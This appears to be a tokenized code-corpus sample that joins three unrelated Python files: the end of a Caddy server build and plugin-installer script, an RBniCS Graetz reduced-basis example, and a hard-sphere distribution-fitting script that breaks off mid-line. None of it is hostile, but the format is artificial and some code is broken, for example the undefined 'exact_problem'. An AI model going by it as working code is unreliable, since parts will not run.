<dedent> elif plugin == 'http.cgi' : <newline> <indent> plugin = 'github.com/jung-kurt/caddy-cgi' <newline> subprocess . call ( [ 'go' , 'get' , plugin ] ) <newline> <dedent> elif plugin == 'http.cors' : <newline> <indent> plugin = 'github.com/captncraig/cors' <newline> subprocess . call ( [ 'go' , 'get' , plugin ] ) <newline> <dedent> elif plugin == 'http.datadog' : <newline> <indent> plugin = 'github.com/payintech/caddy-datadog' <newline> subprocess . call ( [ 'go' , 'get' , plugin ] ) <newline> <dedent> elif plugin == 'http.expires' : <newline> <indent> plugin = 'github.com/epicagency/caddy-expires' <newline> subprocess . call ( [ 'go' , 'get' , plugin ] ) <newline> <dedent> elif plugin == 'http.filemanager' : <newline> <indent> plugin = 'github.com/hacdias/filemanager' <newline> subprocess . call ( [ 'go' , 'get' , plugin ] ) <newline> <dedent> elif plugin == 'http.filter' : <newline> <indent> plugin = 'github.com/echocat/caddy-filter' <newline> subprocess . call ( [ 'go' , 'get' , plugin ] ) <newline> <dedent> elif plugin == 'http.forwardproxy' : <newline> <indent> plugin = 'github.com/caddyserver/forwardproxy' <newline> subprocess . call ( [ 'go' , 'get' , plugin ] ) <newline> <dedent> elif plugin == 'http.git' : <newline> <indent> plugin = 'github.com/abiosoft/caddy-git' <newline> subprocess . call ( [ 'go' , 'get' , plugin ] ) <newline> <dedent> elif plugin == 'http.gopkg' : <newline> <indent> plugin = 'github.com/zikes/gopkg' <newline> subprocess . call ( [ 'go' , 'get' , plugin ] ) <newline> <dedent> elif plugin == 'http.grpc' : <newline> <indent> plugin = 'github.com/pieterlouw/caddy-grpc' <newline> subprocess . call ( [ 'go' , 'get' , plugin ] ) <newline> <dedent> elif plugin == 'http.hugo' : <newline> <indent> plugin = 'github.com/hacdias/filemanager' <newline> subprocess . call ( [ 'go' , 'get' , plugin ] ) <newline> <dedent> elif plugin == 'http.ipfilter' : <newline> <indent> plugin = 'github.com/pyed/ipfilter' <newline> subprocess . call ( [ 'go' , 'get' , plugin ] ) <newline> <dedent> elif plugin == 'http.jekyll' : <newline> <indent> plugin = 'github.com/hacdias/filemanager' <newline> subprocess . call ( [ 'go' , 'get' , plugin ] ) <newline> <dedent> elif plugin == 'http.jwt' : <newline> <indent> plugin = 'github.com/BTBurke/caddy-jwt' <newline> subprocess . call ( [ 'go' , 'get' , plugin ] ) <newline> <dedent> elif plugin == 'http.login' : <newline> <indent> plugin = 'github.com/tarent/loginsrv' <newline> subprocess . call ( [ 'go' , 'get' , plugin ] ) <newline> <dedent> elif plugin == 'http.mailout' : <newline> <indent> plugin = 'github.com/SchumacherFM/mailout' <newline> subprocess . call ( [ 'go' , 'get' , plugin ] ) <newline> <dedent> elif plugin == 'http.minify' : <newline> <indent> plugin = 'github.com/hacdias/caddy-minify' <newline> subprocess . call ( [ 'go' , 'get' , plugin ] ) <newline> <dedent> elif plugin == 'http.nobots' : <newline> <indent> plugin = 'github.com/Xumeiquer/nobots' <newline> subprocess . call ( [ 'go' , 'get' , plugin ] ) <newline> <dedent> elif plugin == 'http.prometheus' : <newline> <indent> plugin = 'github.com/miekg/caddy-prometheus' <newline> subprocess . call ( [ 'go' , 'get' , plugin ] ) <newline> <dedent> elif plugin == 'http.proxyprotocol' : <newline> <indent> plugin = 'github.com/mastercactapus/caddy-proxyprotocol' <newline> subprocess . call ( [ 'go' , 'get' , plugin ] ) <newline> <dedent> elif plugin == 'http.ratelimit' : <newline> <indent> plugin = 'github.com/xuqingfeng/caddy-rate-limit' <newline> subprocess . call ( [ 'go' , 'get' , plugin ] ) <newline> <dedent> elif plugin == 'http.realip' : <newline> <indent> plugin = 'github.com/captncraig/caddy-realip' <newline> subprocess . call ( [ 'go' , 'get' , plugin ] ) <newline> <dedent> elif plugin == 'http.reauth' : <newline> <indent> plugin = 'github.com/freman/caddy-reauth' <newline> subprocess . call ( [ 'go' , 'get' , plugin ] ) <newline> <dedent> elif plugin == 'http.restic' : <newline> <indent> plugin = 'github.com/restic/caddy' <newline> subprocess . call ( [ 'go' , 'get' , plugin ] ) <newline> <dedent> elif plugin == 'http.upload' : <newline> <indent> plugin = 'github.com/wmark/caddy.upload' <newline> subprocess . call ( [ 'go' , 'get' , plugin ] ) <newline> <dedent> elif plugin == 'http.webdav' : <newline> <indent> plugin = 'github.com/hacdias/caddy-webdav' <newline> subprocess . call ( [ 'go' , 'get' , plugin ] ) <newline> <dedent> elif plugin == 'tls.dns.cloudflare' : <newline> <indent> plugin = 'github.com/caddyserver/dnsproviders' <newline> subprocess . call ( [ 'go' , 'get' , plugin ] ) <newline> plugin = 'github.com/caddyserver/dnsproviders/cloudflare' <newline> <dedent> elif plugin == 'tls.dns.digitalocean' : <newline> <indent> plugin = 'github.com/caddyserver/dnsproviders' <newline> subprocess . call ( [ 'go' , 'get' , plugin ] ) <newline> plugin = 'github.com/caddyserver/dnsproviders/digitalocean' <newline> <dedent> elif plugin == 'tls.dns.dnsimple' : <newline> <indent> plugin = 'github.com/caddyserver/dnsproviders' <newline> subprocess . call ( [ 'go' , 'get' , plugin ] ) <newline> plugin = 'github.com/caddyserver/dnsproviders/dnsimple' <newline> <dedent> elif plugin == 'tls.dns.dnspod' : <newline> <indent> plugin = 'github.com/caddyserver/dnsproviders' <newline> subprocess . call ( [ 'go' , 'get' , plugin ] ) <newline> plugin = 'github.com/caddyserver/dnsproviders/dnspod' <newline> <dedent> elif plugin == 'tls.dns.dyn' : <newline> <indent> plugin = 'github.com/caddyserver/dnsproviders' <newline> subprocess . call ( [ 'go' , 'get' , plugin ] ) <newline> plugin = 'github.com/caddyserver/dnsproviders/dyn' <newline> <dedent> elif plugin == 'tls.dns.exoscale' : <newline> <indent> plugin = 'github.com/caddyserver/dnsproviders' <newline> subprocess . call ( [ 'go' , 'get' , plugin ] ) <newline> plugin = 'github.com/caddyserver/dnsproviders/exoscale' <newline> <dedent> elif plugin == 'tls.dns.gandi' : <newline> <indent> plugin = 'github.com/caddyserver/dnsproviders' <newline> subprocess . call ( [ 'go' , 'get' , plugin ] ) <newline> plugin = 'github.com/caddyserver/dnsproviders/gandi' <newline> <dedent> elif plugin == 'tls.dns.googlecloud' : <newline> <indent> plugin = 'github.com/caddyserver/dnsproviders' <newline> subprocess . call ( [ 'go' , 'get' , plugin ] ) <newline> plugin = 'github.com/caddyserver/dnsproviders/googlecloud' <newline> <dedent> elif plugin == 'tls.dns.linode' : <newline> <indent> plugin = 'github.com/caddyserver/dnsproviders' <newline> subprocess . call ( [ 'go' , 'get' , plugin ] ) <newline> plugin = 'github.com/caddyserver/dnsproviders/linode' <newline> <dedent> elif plugin == 'tls.dns.namecheap' : <newline> <indent> plugin = 'github.com/caddyserver/dnsproviders' <newline> subprocess . call ( [ 'go' , 'get' , plugin ] ) <newline> plugin = 'github.com/caddyserver/dnsproviders/namecheap' <newline> <dedent> elif plugin == 'tls.dns.ovh' : <newline> <indent> plugin = 'github.com/caddyserver/dnsproviders' <newline> subprocess . call ( [ 'go' , 'get' , plugin ] ) <newline> plugin = 'github.com/caddyserver/dnsproviders/ovh' <newline> <dedent> elif plugin == 'tls.dns.rfc2136' : <newline> <indent> plugin = 'github.com/caddyserver/dnsproviders' <newline> subprocess . call ( [ 'go' , 'get' , plugin ] ) <newline> plugin = 'github.com/caddyserver/dnsproviders/rfc2136' <newline> <dedent> elif plugin == 'tls.dns.route53' : <newline> <indent> plugin = 'github.com/caddyserver/dnsproviders' <newline> subprocess . call ( [ 'go' , 'get' , plugin ] ) <newline> plugin = 'github.com/caddyserver/dnsproviders/route53' <newline> <dedent> elif plugin == 'tls.dns.vultr' : <newline> <indent> plugin = 'github.com/caddyserver/dnsproviders' <newline> subprocess . call ( [ 'go' , 'get' , plugin ] ) <newline> plugin = 'github.com/caddyserver/dnsproviders/vultr' <newline> <dedent> elif plugin == 'hook.service' : <newline> <indent> plugin = 'github.com/bruhs/caddy-service' <newline> subprocess . call ( [ 'go' , 'get' , plugin ] ) <newline> <dedent> elif plugin == 'dns' : <newline> <indent> plugin = 'github.com/coredns/coredns' <newline> subprocess . call ( [ 'go' , 'get' , plugin ] ) <newline> <dedent> elif plugin == 'net' : <newline> <indent> plugin = 'github.com/pieterlouw/caddy-net/caddynet' <newline> subprocess . call ( [ 'go' , 'get' , plugin ] ) <newline> <dedent> else : <newline> <indent> print ( err , "bad ▁ plugin:" , plugin ) <newline> exit ( ) <newline>  # ▁ write ▁ to ▁ run.go <encdom> <dedent> inputfile = open ( 'run.go' , 'r' ) . readlines ( ) <newline> write_file = open ( 'run.go' , 'w' ) <newline> for line in inputfile : <newline> <indent> if not plugin in line : <newline> <indent> write_file . write ( line ) <newline> if 'imported' in line : <newline> <indent> write_file . write ( ' <tabsymbol> ' + '_ ▁ ' + '"' + plugin + '"' + os . linesep ) <newline> <dedent> <dedent> <dedent> write_file . close ( ) <newline> print ( "imported:" , plugin ) <newline> <dedent> def Build ( ) : <newline> <indent> devnull = open ( os . devnull , "w" ) <newline> cmd = "where" if whatos == "windows" else "which" <newline> checkgit = subprocess . call ( [ cmd , 'git' ] , stdout = devnull , stderr = subprocess . STDOUT ) <newline> if checkgit != 0 : <newline> <indent> print ( err , 'exec: ▁"git": ▁ executable ▁ file ▁ not ▁ found ▁ in ▁ $PATH' ) <newline> exit ( ) <newline> <dedent> checkgo = subprocess . call ( [ cmd , 'go' ] , stdout = devnull , stderr = subprocess . STDOUT ) <newline> if checkgo != 0 : <newline> <indent> print ( err , 'exec: ▁"go": ▁ executable ▁ file ▁ not ▁ found ▁ in ▁ $PATH' ) <newline> exit ( ) <newline>  # ▁ get ▁ caddy ▁ via ▁ go <encdom> <dedent> print ( "please ▁ wait. ▁ downloading ▁ latest ▁ source.." ) <newline> subprocess . call ( [ 'go' , 'get' , 'github.com/caddyserver/builds' ] ) <newline> subprocess . call ( [ 'go' , 'get' , 'github.com/caddyserver/caddy' ] ) <newline> os . chdir ( caddygo + slash + 'caddymain' ) <newline>  # ▁ Check ▁ if ▁ plugin ▁ need ▁ to ▁ be ▁ installed <encdom> if len ( sys . argv ) == 3 : <newline> <indent> if str ( sys . argv [ 2 ] ) in [ "-p" , "-P" , "--plugin" , "--plugins" ] : <newline> <indent> print ( err , "you ▁ did ▁ not ▁ pass ▁ any ▁ plugins ▁ to ▁ build" ) <newline> exit ( ) <newline> <dedent> else : <newline> <indent> print ( str ( sys . argv [ 2 ] ) , "is ▁ unknown ▁ parameter!" ) <newline> exit ( ) <newline> <dedent> <dedent> if len ( sys . argv ) >= 3 : <newline> <indent> if str ( sys . argv [ 2 ] ) in [ "-p" , "-P" , "--plugin" , "--plugins" ] : <newline> <indent> plugins = ( sys . argv [ 3 ] . split ( ',' ) ) <newline> for word in plugins : <newline> <indent> AddPlugin ( word ) <newline> <dedent> <dedent> else : <newline> <indent> print ( str ( sys . argv [ 3 ] ) , "is ▁ not ▁ a ▁ valid ▁ argument!" ) <newline> exit ( ) <newline>  # ▁ build ▁ caddy ▁ web ▁ server <encdom> <dedent> <dedent> os . chdir ( caddygo ) <newline> print ( "building ▁ caddy ▁ web ▁ server.." ) <newline> subprocess . call ( [ 'go' , 'run' , 'build.go' ] ) <newline> if os . path . isfile ( "caddy" ) : <newline> <indent> os . rename ( "caddy" , cwd + slash + "caddy" ) <newline> print ( scs , "finised ▁ building:" , cwd + slash + "caddy" ) <newline> exit ( ) <newline> <dedent> else : <newline> <indent> print ( err , "are ▁ you ▁ sure ▁ all ▁ build ▁ tools ▁ is ▁ installed?" ) <newline>  # ▁ main ▁ commands! <encdom> <dedent> <dedent> try : <newline> <indent> getbits = platform . architecture ( ) [ 0 ] <newline> cpubits = "unknown" <newline> if getbits == '64bit' : <newline> <indent> cpubits = "amd64" <newline> cpubitsname = "64bit.." <newline> <dedent> elif getbits == '32bit' : <newline> <indent> cpubits = "386" <newline> cpubitsname = "32bit.." <newline> <dedent> isarm = platform . uname ( ) [ 4 ] . lower ( ) <newline> if isarm [ : 3 ] == 'arm' : <newline> <indent> cpubits = isarm [ : 3 ] + isarm [ 4 ] <newline> if getbits == '64bit' : <newline> <indent> cpubits = 'arm64' <newline> <dedent> cpubitsname = isarm + ".." <newline> <dedent> if isarm == 'aarch64' : <newline> <indent> cpubits = 'arm64' <newline> cpubitsname = "arm ▁ 64bit.." <newline> <dedent> if str ( sys . argv [ 1 ] ) == "get" : <newline> <indent> if os . path . isfile ( "caddyserver" + slash + "caddy" ) : <newline> <indent> print ( err , "caddy ▁ exists: ▁ caddyserver/caddy" ) <newline> exit ( ) <newline> <dedent> if cpubits == "unknown" : <newline> <indent> print ( "unknown ▁ architecture!" ) <newline> exit ( ) <newline> <dedent> Get ( ) <newline> <dedent> elif str ( sys . argv [ 1 ] ) == "build" : <newline> <indent> Build ( ) <newline> <dedent> elif str ( sys . argv [ 1 ] ) == "install" : <newline> <indent> devnull = open ( os . devnull , "w" ) <newline> cmd = "where" if whatos == "windows" else "which" <newline> checkgit = subprocess . call ( [ cmd , 'git' ] , stdout = devnull , stderr = subprocess . STDOUT ) <newline> checkgo = subprocess . call ( [ cmd , 'go' ] , stdout = devnull , stderr = subprocess . STDOUT ) <newline> if checkgit == 0 and checkgo == 0 : <newline> <indent> print ( "found ▁ git ▁ and ▁ go ▁ installed!" ) <newline> print ( "executing ▁ build ▁ script.." ) <newline> Build ( ) <newline> print ( "executing ▁ download ▁ command.." ) <newline> Get ( ) <newline> <dedent> else : <newline> <indent> print ( "git ▁ or ▁ go ▁ is ▁ not ▁ installed!" ) <newline> print ( "executing ▁ download ▁ command.." ) <newline> Get ( ) <newline> <dedent> <dedent> <dedent> except KeyboardInterrupt : <newline> <indent> print ( "Aborted." ) <newline> exit ( ) <newline> <dedent>
 # ▁ Copyright ▁ (C) ▁ 2015-2020 ▁ by ▁ the ▁ RBniCS ▁ authors <encdom>  # ▁ This ▁ file ▁ is ▁ part ▁ of ▁ RBniCS. <encdom>  # ▁ SPDX-License-Identifier: ▁ LGPL-3.0-or-later <encdom> from dolfin import * <newline> from rbnics import * <newline> @ SCM ( ) <newline> @ PullBackFormsToReferenceDomain ( ) <newline> @ ShapeParametrization ( ( "x[0]" , "x[1]" ) ,  # ▁ subdomain ▁ 1 <encdom> ( "mu[0]*(x[0] ▁ - ▁ 1) ▁ + ▁ 1" , "x[1]" ) ,  # ▁ subdomain ▁ 2 <encdom> ) <newline> class Graetz ( EllipticCoerciveProblem ) : <newline>  # ▁ Default ▁ initialization ▁ of ▁ members <encdom> <indent> @ generate_function_space_for_stability_factor <newline> def __init__ ( self , V , ** kwargs ) : <newline>  # ▁ Call ▁ the ▁ standard ▁ initialization <encdom> <indent> EllipticCoerciveProblem . __init__ ( self , V , ** kwargs ) <newline>  # ▁ ... ▁ and ▁ also ▁ store ▁ FEniCS ▁ data ▁ structures ▁ for ▁ assembly <encdom> assert "subdomains" in kwargs <newline> assert "boundaries" in kwargs <newline> self . subdomains , self . boundaries = kwargs [ "subdomains" ] , kwargs [ "boundaries" ] <newline> self . u = TrialFunction ( V ) <newline> self . v = TestFunction ( V ) <newline> self . dx = Measure ( "dx" ) ( subdomain_data = subdomains ) <newline> self . ds = Measure ( "ds" ) ( subdomain_data = boundaries ) <newline>  # ▁ Store ▁ the ▁ velocity ▁ expression <encdom> self . vel = Expression ( "x[1]*(1-x[1])" , element = self . V . ufl_element ( ) ) <newline>  # ▁ Customize ▁ eigen ▁ solver ▁ parameters <encdom> self . _eigen_solver_parameters . update ( { "bounding_box_minimum" : { "problem_type" : "gen_hermitian" , "spectral_transform" : "shift-and-invert" , "spectral_shift" : 1.e-5 , "linear_solver" : "mumps" } , "bounding_box_maximum" : { "problem_type" : "gen_hermitian" , "spectral_transform" : "shift-and-invert" , "spectral_shift" : 1.e5 , "linear_solver" : "mumps" } , "stability_factor" : { "problem_type" : "gen_hermitian" , "spectral_transform" : "shift-and-invert" , "spectral_shift" : 1.e-5 , "linear_solver" : "mumps" } } ) <newline>  # ▁ Return ▁ custom ▁ problem ▁ name <encdom> <dedent> def name ( self ) : <newline> <indent> return "Graetz1" <newline>  # ▁ Return ▁ theta ▁ multiplicative ▁ terms ▁ of ▁ the ▁ affine ▁ expansion ▁ of ▁ the ▁ problem. <encdom> <dedent> @ compute_theta_for_stability_factor <newline> def compute_theta ( self , term ) : <newline> <indent> mu = self . mu <newline> if term == "a" : <newline> <indent> theta_a0 = mu [ 1 ] <newline> theta_a1 = 1.0 <newline> return ( theta_a0 , theta_a1 ) <newline> <dedent> elif term == "f" : <newline> <indent> theta_f0 = 1.0 <newline> return ( theta_f0 , ) <newline> <dedent> elif term == "dirichlet_bc" : <newline> <indent> theta_bc0 = 1.0 <newline> return ( theta_bc0 , ) <newline> <dedent> else : <newline> <indent> raise ValueError ( "Invalid ▁ term ▁ for ▁ compute_theta()." ) <newline>  # ▁ Return ▁ forms ▁ resulting ▁ from ▁ the ▁ discretization ▁ of ▁ the ▁ affine ▁ expansion ▁ of ▁ the ▁ problem ▁ operators. <encdom> <dedent> <dedent> @ assemble_operator_for_stability_factor <newline> def assemble_operator ( self , term ) : <newline> <indent> v = self . v <newline> dx = self . dx <newline> if term == "a" : <newline> <indent> u = self . u <newline> vel = self . vel <newline> a0 = inner ( grad ( u ) , grad ( v ) ) * dx <newline> a1 = vel * u . dx ( 0 ) * v * dx <newline> return ( a0 , a1 ) <newline> <dedent> elif term == "f" : <newline> <indent> f0 = Constant ( 0.0 ) * v * dx <newline> return ( f0 , ) <newline> <dedent> elif term == "dirichlet_bc" : <newline> <indent> bc0 = [ DirichletBC ( self . V , Constant ( 0.0 ) , self . boundaries , 1 ) , DirichletBC ( self . V , Constant ( 1.0 ) , self . boundaries , 2 ) , DirichletBC ( self . V , Constant ( 1.0 ) , self . boundaries , 3 ) , DirichletBC ( self . V , Constant ( 1.0 ) , self . boundaries , 5 ) , DirichletBC ( self . V , Constant ( 1.0 ) , self . boundaries , 6 ) , DirichletBC ( self . V , Constant ( 0.0 ) , self . boundaries , 7 ) , DirichletBC ( self . V , Constant ( 0.0 ) , self . boundaries , 8 ) ] <newline> return ( bc0 , ) <newline> <dedent> elif term == "inner_product" : <newline> <indent> u = self . u <newline> x0 = inner ( grad ( u ) , grad ( v ) ) * dx <newline> return ( x0 , ) <newline> <dedent> else : <newline> <indent> raise ValueError ( "Invalid ▁ term ▁ for ▁ assemble_operator()." ) <newline>  # ▁ 1. ▁ Read ▁ the ▁ mesh ▁ for ▁ this ▁ problem <encdom> <dedent> <dedent> <dedent> mesh = Mesh ( "data/graetz.xml" ) <newline> subdomains = MeshFunction ( "size_t" , mesh , "data/graetz_physical_region.xml" ) <newline> boundaries = MeshFunction ( "size_t" , mesh , "data/graetz_facet_region.xml" ) <newline>  # ▁ 2. ▁ Create ▁ Finite ▁ Element ▁ space ▁ (Lagrange ▁ P1) <encdom> V = FunctionSpace ( mesh , "Lagrange" , 1 ) <newline>  # ▁ 3. ▁ Allocate ▁ an ▁ object ▁ of ▁ the ▁ Graetz ▁ class <encdom> graetz_problem = Graetz ( V , subdomains = subdomains , boundaries = boundaries ) <newline> mu_range = [ ( 0.1 , 10.0 ) , ( 0.01 , 10.0 ) ] <newline> graetz_problem . set_mu_range ( mu_range ) <newline>  # ▁ 4. ▁ Prepare ▁ reduction ▁ with ▁ a ▁ reduced ▁ basis ▁ method <encdom> reduced_basis_method = ReducedBasis ( graetz_problem ) <newline> reduced_basis_method . set_Nmax ( 30 , SCM = 50 ) <newline> reduced_basis_method . set_tolerance ( 1e-5 , SCM = 1e-3 ) <newline>  # ▁ 5. ▁ Perform ▁ the ▁ offline ▁ phase <encdom> lifting_mu = ( 1.0 , 1.0 ) <newline> graetz_problem . set_mu ( lifting_mu ) <newline> reduced_basis_method . initialize_training_set ( 200 , SCM = 250 ) <newline> reduced_graetz_problem = reduced_basis_method . offline ( ) <newline>  # ▁ 6. ▁ Perform ▁ an ▁ online ▁ solve <encdom> online_mu = ( 10.0 , 0.01 ) <newline> reduced_graetz_problem . set_mu ( online_mu ) <newline> reduced_graetz_problem . solve ( ) <newline> reduced_graetz_problem . export_solution ( filename = "online_solution" ) <newline>  # ▁ 7. ▁ Perform ▁ an ▁ error ▁ analysis <encdom> reduced_basis_method . initialize_testing_set ( 100 , SCM = 100 ) <newline> reduced_basis_method . error_analysis ( filename = "error_analysis" ) <newline>  # ▁ 8. ▁ Perform ▁ a ▁ speedup ▁ analysis <encdom> reduced_basis_method . speedup_analysis ( filename = "speedup_analysis" ) <newline>  # ▁ 9. ▁ Perform ▁ an ▁ error ▁ analysis ▁ employing ▁ a ▁ smaller ▁ number ▁ of ▁ SCM ▁ constraints <encdom> reduced_basis_method . error_analysis ( SCM = 5 , filename = "error_analysis__SCM_5" ) <newline>  # ▁ 10. ▁ Perform ▁ a ▁ speedup ▁ analysis ▁ employing ▁ a ▁ smaller ▁ number ▁ of ▁ SCM ▁ constraints <encdom> reduced_basis_method . speedup_analysis ( SCM = 5 , filename = "speedup_analysis__SCM_5" ) <newline>  # ▁ 11. ▁ Perform ▁ an ▁ error ▁ analysis ▁ with ▁ respect ▁ to ▁ the ▁ exact ▁ problem, <encdom>  # ▁ for ▁ which ▁ SCM ▁ is ▁ replaced ▁ by ▁ ExactCoercivityConstant <encdom> reduced_basis_method . error_analysis ( with_respect_to = exact_problem , filename = "error_analysis__with_respect_to_exact" ) <newline>  # ▁ 12. ▁ Perform ▁ a ▁ speedup ▁ analysis ▁ with ▁ respect ▁ to ▁ the ▁ exact ▁ problem <encdom> reduced_basis_method . speedup_analysis ( with_respect_to = exact_problem , filename = "speedup_analysis__with_respect_to_exact" ) <newline>
 # !/usr/bin/python <encdom> from __future__ import division <newline>  # ▁ We ▁ need ▁ the ▁ following ▁ two ▁ lines ▁ in ▁ order ▁ for ▁ matplotlib ▁ to ▁ work <encdom>  # ▁ without ▁ access ▁ to ▁ an ▁ X ▁ server. <encdom> import matplotlib , sys , os . path <newline> if len ( sys . argv ) < 2 or sys . argv [ 1 ] != "show" : <newline> <indent> matplotlib . use ( 'Agg' ) <newline> <dedent> from pylab import * <newline> from scipy . optimize import leastsq <newline> sigma = 2 <newline> fig = figure ( 1 ) <newline> ax = fig . add_subplot ( 111 ) <newline> ax . set_title ( '$g_{HS}(r)$' )  # radial ▁ distribution ▁ for ▁ hard ▁ spheres <encdom> <newline> ax . axvline ( x = sigma , color = 'k' , linestyle = ':' ) <newline> ax . axhline ( y = 1 , color = 'k' , linestyle = ':' ) <newline> x = rand ( 5 ) * 5 <newline> x [ 0 ] = 1.706 <newline> x [ 1 ] = 1.358 <newline> x [ 2 ] = 1.567 <newline> x [ 3 ] = 0.675 <newline> x [ 4 ] = 0.463 <newline> colors = [ 'r' , 'g' , 'b' , 'c' , 'm' , 'k' , 'y' ] * 2 <newline> ff = array ( [ .1 , .2 , .3 , .4 ] ) <newline>  # ff ▁ = ▁ array([.05, ▁ .1, ▁ .15, ▁ .2, ▁ .25, ▁ .3, ▁ .35, ▁ .4, ▁ .45, ▁ .5]) <encdom> able_to_read_file = True <newline> def read_ghs ( base , ff ) : <newline> <indent> mcdatafilename = "%s-%4.2f.dat" % ( base , ff ) <newline> if ( os . path . isfile ( mcdatafilename ) == False ) : <newline> <indent> print ( "File ▁ does ▁ not ▁ exist: ▁ " , mcdatafilename ) <newline> global able_to_read_file <newline> able_to_read_file = False <newline> return 0 , 0 <newline> <dedent> mcdata = loadtxt ( mcdatafilename ) <newline> print ( 'Using' , mcdatafilename , 'for ▁ filling ▁ fraction' , ff ) <newline> r_mc = mcdata [ : , 0 ] <newline> n_mc = mcdata [ : , 1 ] <newline> ghs = n_mc / ff <newline> return r_mc , ghs <newline>  # ▁ READ ▁ DATA <encdom> <dedent> ghs = [ 0 ] * len ( ff ) <newline>  # ghslores ▁ = ▁ [0]*len(ff) <encdom> eta = [ 0 ] * len ( ff ) <newline> for i in range ( len ( ff ) ) : <newline> <indent> r_mc , ghs [ i ] = read_ghs ( "figs/gr" , ff [ i ] ) <newline> if able_to_read_file == False : <newline> <indent> break <newline>  # r_mclores, ▁ ghslores[i] ▁ = ▁ read_ghs("grlores", ▁ ff[i]) <encdom> <dedent> figure ( 1 ) <newline> ax . plot ( r_mc , ghs [ i ] , colors [ i ] + ":" , label = 'ghs ▁ at ▁ filling ▁ fraction ▁ %.2f' % ff [ i ] ) <newline>  # ▁ The ▁ following ▁ is ▁ the ▁ Monte ▁ Carlo ▁ approximation ▁ of ▁ the <encdom>  # ▁ distribution ▁ function ▁ at ▁ contact. ▁ This ▁ gives ▁ us ▁ an ▁ answer ▁ with <encdom>  # ▁ no ▁ systematic ▁ error ▁ (well, ▁ very ▁ little, ▁ and ▁ what ▁ we ▁ have ▁ is ▁ due <encdom>  # ▁ to ▁ the ▁ finite ▁ bin ▁ size), ▁ and ▁ if ▁ we ▁ wait ▁ long ▁ enough ▁ the <encdom>  # ▁ statistical ▁ error ▁ should ▁ become ▁ negligible. <encdom>  # gsig[i] ▁ = ▁ ghs[i].max() <encdom>  # ▁ The ▁ following ▁ is ▁ the ▁ Carnahan ▁ Starling ▁ formula ▁ for ▁ the <encdom>  # ▁ distribution ▁ function ▁ at ▁ contact. ▁ This ▁ is ▁ approximate, ▁ but ▁ it <encdom>  # ▁ is ▁ a ▁ good ▁ approximation. <encdom> eta [ i ] = ff [ i ] <newline> r = r_mc <newline> <dedent> def evalg ( xnew , eta , r ) : <newline> <indent> return evalg_nosquare ( xnew , eta , r ) <newline> <dedent> toprint = True <newline> def evalg_nosquare ( xnew , eta , r ) : <newline> <indent> global toprint <newline> z = r - sigma <newline> hsigma = ( 1 - 0.5 * eta ) / ( 1 - eta ) ** 3 - 1 <newline> density = 3 / 4 / pi * eta <newline> rhs = ( 1 - eta ) ** 4 / ( 1 + 4 * eta + 4 * eta ** 2 - 4 * eta ** 3 + eta ** 4 ) / 3 <newline> a0 = xnew [ 0 ] <newline> a1 = 0  # ▁ this ▁ parameter ▁ is ▁ constrained ▁ via ▁ integral <encdom> <newline> a2 = xnew [ 1 ] <newline> a3 = xnew [ 2 ] <newline> a4 = 0  # ▁ constrained ▁ by ▁ slope ▁ at ▁ sigma <encdom> <newline> a5 = xnew [ 3 ] <newline> a6 = xnew [ 4 ] <newline> int_h0 = 4 * pi * hsigma * ( 2 + sigma * a0 * ( 2 + sigma * a0 ) ) / a0 ** 3 <newline> int_h1_over_a1 = 4 * pi * a2 * ( sigma ** 2 * a2 ** 4 + 2 * a2 ** 2 * ( - 1 + sigma * a3 * ( 2 + sigma * a3 ) ) + a3 ** 2 * ( 6 + sigma * a3 * ( 4 + sigma * a3 ) ) ) / ( a2 ** 2 + a3 ** 2 ) ** 3 <newline> int_h2_over_a4 = 4 * pi * a5 * ( sigma ** 2 * a5 ** 4 + 2 * a5 ** 2 * ( - 1 + sigma * a6 * ( 2 + sigma * a6 ) ) + a6 ** 2 * ( 6 + sigma * a6 * ( 4 + sigma * a6 ) ) ) / ( a5 ** 2 + a6 ** 2 ) ** 3 <newline> A = ( rhs - 1 ) / density - int_h0 <newline> B = int_h2_over_a4 <newline> C = int_h1_over_a1 <newline> a1 = ( A / C - B * hsigma / C / a5 * ( - 1 - hsigma + a0 ) ) / ( 1 - B * a2 / C / a5 ) <newline> a4 = hsigma / a5 * ( - 1 - hsigma + a0 - a1 * a2 / hsigma )  # ▁ this ▁ matches ▁ slope ▁ at ▁ x ▁ = ▁ sigma <encdom> <newline> if toprint : <newline> <indent> print ( eta , a1 , a4 , a1 / a4 ) <newline> toprint = False <newline> <dedent> f0 = hsigma <newline> j0 = exp ( - a0 * z ) <newline> f1 = a1 <newline> j1 = sin ( a2 * z ) * exp ( - a3 * z ) <newline> f2 = a4 <newline> j2 = sin ( a5 * z ) * exp ( - a6 * z ) <newline> return 1 + f0 * j0 + f1 * j1 + f2 * j2 <newline> <dedent> def dist ( x ) : <newline>  # ▁ function ▁ with ▁ x[i] ▁ as ▁ constants ▁ to ▁ be ▁ determined <encdom> <indent> g = zeros_like ( etaconcatenated ) <newline> for i in range ( len ( g ) ) : <newline> <indent> g [ i ] = evalg ( x , etaconcatenated [ i ] , rconcatenated [ i ] ) <newline> <dedent> return g <newline> <dedent> def dist2 ( x ) : <newline> <indent> return dist ( x ) - ghsconcatenated <newline> <dedent> ghsconcatenated = ghs [ 0 ] <newline> for i in range ( 1 , len ( ff ) ) : <newline> <indent> ghsconcatenated = concatenate ( ( ghsconcatenated , ghs [ i ] ) ) <newline> <dedent> etaconcatenated = [ 0 ] * len ( r ) * len ( eta ) <newline> j = 0 <newline> while ( j < len ( eta ) ) : <newline> <indent> i = 0 <newline> while ( i < len ( r ) ) : <newline> <indent> etaconcatenated [ i + j * len ( r ) ] = eta [ j ] <newline> i += 1 <newline> <dedent> j += 1 <newline> <dedent> rconcatenated = [ 0 ] * len ( r ) * len ( eta ) <newline> j = 0 <newline> while ( j < len ( eta ) ) : <newline> <indent> i = 0 <newline> while ( i < len ( r ) ) : <newline> <indent> rconcatenated [ i + j * len ( r ) ] = r [ i ] <newline> i += 1 <newline> <dedent> j += 1 <newline> <dedent> g = dist ( x ) <newline> toprint = True <newline>  # ▁ make ▁ plots: <encdom> plots = [ 0 ] * len ( ff ) <newline> for i in range ( len ( ff ) ) : <newline> <indent> plots [ i ] , = ax . plot ( r_mc , g [ i * len ( r ) : ( i + 1 ) * len ( r ) ] , colors [ i ] + '-' , label = 'g ▁ at ▁ filling ▁ fraction ▁ %.2f' % ff [ i ] ) <newline>  # ▁ sliders <encdom> <dedent> y0 = .025 <newline> dy = .025 <newline> sliders_ax = [ 0 ] * len ( x ) <newline> sliders = [ 0 ] * len ( x ) <newline> for i in range ( len ( x ) ) : <newline> <indent> sliders_ax [ i ] = axes ( [ 0.25 , y0 + i * dy , 